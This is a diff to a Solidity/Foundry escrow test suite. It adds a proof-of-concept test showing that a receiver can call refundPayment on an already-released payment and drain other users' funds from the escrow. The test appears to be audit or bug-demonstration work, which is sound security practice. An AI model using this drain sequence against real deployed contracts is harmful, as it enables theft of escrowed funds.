@@ -117,6 +117,18 @@ contract PaymentEscrowTest is Test {
         assertEq(actual.released, expected.released);
     }
 
+    // balances helper function for testing
+    function _recordBalances() internal view returns (uint256[] memory) {
+        uint256[] memory balances = new uint256[](5);
+        balances[0] = address(escrow).balance; // Escrow balance
+        balances[1] = _getBalance(receiver1, false); // Receiver1 balance
+        balances[2] = _getBalance(payer1, false); // Payer1 balance
+        balances[3] = _getBalance(receiver2, false); // Receiver2 balance
+        balances[4] = _getBalance(payer2, false); // Payer2 balance
+        return balances;
+    }
+
+
     // Deployment
     function testDeploymentArbiterRole() public {
         bool hasArbiterArbiter = securityContext.hasRole(ARBITER_ROLE, arbiter);
@@ -1007,6 +1019,80 @@ contract PaymentEscrowTest is Test {
         assertEq(address(escrow).balance, initialBalance + transferAmount);
     }
 
+    function testRefundAfterReleaseWithActiveEscrow() public {
+        // Exploit: malcious actor is able to refund the payment after it has been released stealing the funds in escrow 
+        // 1. Place a payment from payer1 to receiver1
+        // 2. malicious actor pays self through escrow and releases the payment to self
+        // 3. malicious actor refunds the payment to self, since no check for released payment, the funds are refunded to the malicious actor
+        // 4. escrow balance is drained to 0
+        uint256 amountEscrowed = 1 ether;
+        uint256 amountReleased = 1 ether;
+
+        // Record initial balances
+        uint256[] memory initialBalances = _recordBalances();
+        console.log("Initial Balances: ");
+        for (uint256 i = 0; i < initialBalances.length; i++) {
+            console.log(initialBalances[i]);
+        }
+
+        // First payment: From payer1 to receiver1, stays in escrow
+        bytes32 paymentIdEscrowed = keccak256("payment-escrowed");
+        _placePayment(paymentIdEscrowed, payer1, receiver1, amountEscrowed, false);
+        console.log("Escrow Balance After First Payment: ", address(escrow).balance);
+
+        // Second payment: From payer2 to receiver2, will be fully released
+        bytes32 paymentIdReleased = keccak256("payment-released");
+        _placePayment(paymentIdReleased, payer2, receiver2, amountReleased, false);
+
+        uint256 escrowBalanceAfterSecond = address(escrow).balance;
+        console.log("Escrow Balance After Second Payment: ", escrowBalanceAfterSecond);
+
+        // Release the second payment completely
+        vm.prank(payer2);
+        escrow.releaseEscrow(paymentIdReleased);
+        vm.prank(receiver2);
+        escrow.releaseEscrow(paymentIdReleased);
+
+        // After releasing the second payment
+        uint256 escrowBalanceAfterRelease = address(escrow).balance;
+        console.log("Escrow Balance After Release: ", escrowBalanceAfterRelease);
+
+        // Ensure the second payment is fully released
+        Payment memory releasedPayment = _getPayment(paymentIdReleased);
+        assertTrue(releasedPayment.released);
+
+        // Malicious refund attempt by receiver2
+        vm.prank(receiver2);
+        escrow.refundPayment(paymentIdReleased, amountReleased);
+
+        // Final balances after the malicious refund
+        uint256[] memory finalBalances = _recordBalances();
+        console.log("Final Balances: ");
+        for (uint256 i = 0; i < finalBalances.length; i++) {
+            console.log(finalBalances[i]);
+        }
+        // finalBalances[0] - Escrow contract balance
+        // finalBalances[1] - Receiver1's balance
+        // finalBalances[2] - Payer1's balance
+        // finalBalances[3] - Receiver2's balance
+        // finalBalances[4] - Payer2's balance
+
+        // Assertions
+        // Check if Receiver2 profited (exploit success)
+        assertTrue(
+            finalBalances[3] + finalBalances[4] > initialBalances[3] + initialBalances[4],
+            "Exploit success: Receiver2 profited"
+        );
+
+        // Check if Payer1 and Receiver1 lost funds, along with escrow depletion
+        assertTrue(
+            finalBalances[1] + finalBalances[2] + finalBalances[0] < initialBalances[1] + initialBalances[2] + initialBalances[0],
+            "Exploit success: Payer1 and Receiver1 lost funds"
+        );
+
+        // Ensure the escrow balance was drained to 0
+        assertEq(finalBalances[0], 0, "Exploit success: Escrow balance drained");
+    }
 
     // Event Tests
 
